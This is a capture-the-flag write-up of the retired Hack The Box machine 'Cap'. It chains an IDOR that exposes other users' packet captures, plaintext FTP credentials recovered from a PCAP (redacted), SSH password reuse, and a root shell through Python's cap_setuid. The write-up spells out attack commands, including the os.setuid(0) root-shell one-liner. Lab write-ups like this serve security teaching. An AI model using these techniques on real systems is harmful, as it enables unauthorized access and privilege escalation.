---
title: Cap
platform: Hack The Box
category: Machines
difficulty: Easy
os: Linux
date_started: 2026-02-16
date_completed: 2026-02-16
tags: [htb, easy, linux, idor, pcap, ftp, cap_setuid, python, gunicorn]
---

> **Disclaimer:** This writeup is published after the machine was retired from Hack The Box. All flags are unique per user.

# Cap

**Hack The Box** · Easy · Linux

`IDOR` · `PCAP Analysis` · `FTP Credential Capture` · `Linux Capabilities (cap_setuid)`

---

## Overview

Cap is a Linux machine running a Python/Gunicorn web application that performs network captures. An IDOR vulnerability exposes other users' packet captures, one of which contains plaintext FTP credentials. Those credentials grant SSH access, and a misconfigured Linux capability on Python leads to root.

---

## Reconnaissance

```bash
nmap -sC -sV <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
```

Three services: FTP (anonymous login denied), SSH, and a web app called "Security Dashboard" running on Gunicorn. The web app is the obvious entry point.

---

## Exploring the Security Dashboard

The dashboard is a network monitoring tool with several features:

- `/capture` — runs a 5-second packet capture, then redirects to `/data/<id>`
- `/ip` — shows IP configuration (like running `ifconfig`)
- `/netstat` — shows active connections
- `/download/<id>` — downloads the PCAP file for a given capture ID

Triggering a capture redirects to `/data/3`, meaning captures 0, 1, and 2 already exist from other users. The IDs are sequential and there's no authorization check — classic IDOR.

---

## Finding the IDOR

Navigating to `/data/0` works without any access control. The PCAP at `/download/0` is significantly larger than the others, suggesting it captured actual traffic rather than an idle network.

```bash
wget http://<TARGET_IP>/download/0 -O capture0.pcap
```

Opening the PCAP in Wireshark (or `tshark`) reveals a plaintext FTP session:

```
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS <redacted>
230 Login successful.
```

FTP transmits credentials in cleartext. The user `nathan` logged in with `<redacted>`.

---

## From PCAP to SSH

Password reuse — the FTP credentials work on SSH too:

```bash
ssh nathan@<TARGET_IP>
# Password: <redacted>
nathan@cap:~$ cat user.txt
```

User flag captured. Now for privilege escalation.

---

## Privilege Escalation via cap_setuid

Linux capabilities are a finer-grained alternative to SUID bits. Instead of giving a binary full root privileges, capabilities grant specific powers. The dangerous one here is `cap_setuid` — the ability to change your user ID.

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_setgid+eip
```

Python3.8 has `cap_setuid`. That means any Python script can call `os.setuid(0)` to become root:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
root@cap:~# cat /root/root.txt
```

Root. The entire chain: IDOR → PCAP → FTP creds → SSH → cap_setuid → root.

---

## Takeaways

- IDOR on sequential IDs is one of the most common web vulnerabilities. Always test `0`, `1`, `-1` when an app uses numbered resources.
- Packet captures on a server may contain other users' plaintext credentials — FTP, Telnet, HTTP Basic Auth are all visible in PCAPs.
- Linux capabilities (`cap_setuid` in particular) are an often-overlooked privilege escalation vector. Always run `getcap -r / 2>/dev/null` during local enumeration.
- Python with `cap_setuid` is an instant root: `os.setuid(0)` is all it takes.

